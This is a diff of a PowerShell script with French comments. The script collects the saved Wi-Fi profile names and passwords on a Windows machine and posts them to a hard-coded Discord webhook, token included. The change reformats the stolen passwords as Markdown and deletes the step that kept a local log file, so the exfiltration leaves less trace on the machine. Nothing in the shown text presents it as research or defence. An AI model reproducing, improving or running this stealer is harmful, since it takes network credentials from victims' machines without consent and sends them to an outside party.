@@ -27,19 +27,24 @@ foreach ($profile in $profiles) {
     }
 }
 
-# Convertir les résultats en format JSON pour l'envoi au webhook
-$jsonResults = $results | ConvertTo-Json -Depth 2
+# Créer le contenu Markdown
+$markdownContent = "## Liste des mots de passe Wi-Fi sur $pcName`n`n"
+
+$results | ForEach-Object {
+    $markdownContent += "### Profil: $($_.PROFILE_NAME)`n"
+    $markdownContent += "**Mot de passe:** $($_.PASSWORD)`n`n"
+}
+
+# Ajouter les lignes de tirets autour du Markdown
+$markdownContentSurrounded = "--------`n$markdownContent`n--------"
 
 # URL de votre webhook Discord
 $webhookUrl = "https://discord.com/api/webhooks/1244988285101801532/2gT9NpiOuMyELp5791kvlBzuGtKpDiDRzdUZYWh0VsTGUotThz44Tt8SxQzOmk2ddnHM"
 
 # Créer le corps de la requête JSON
 $body = @{
-    content = "Liste des mots de passe Wi-Fi sur ${pcName}:`n`n${jsonResults}"
+    content = $markdownContentSurrounded
 } | ConvertTo-Json
 
 # Envoyer la requête au webhook Discord
 Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
-
-# Afficher les résultats dans un tableau et les enregistrer dans un fichier
-$results | Format-Table -AutoSize | Out-File "$env:USERPROFILE\Desktop\Log.txt"
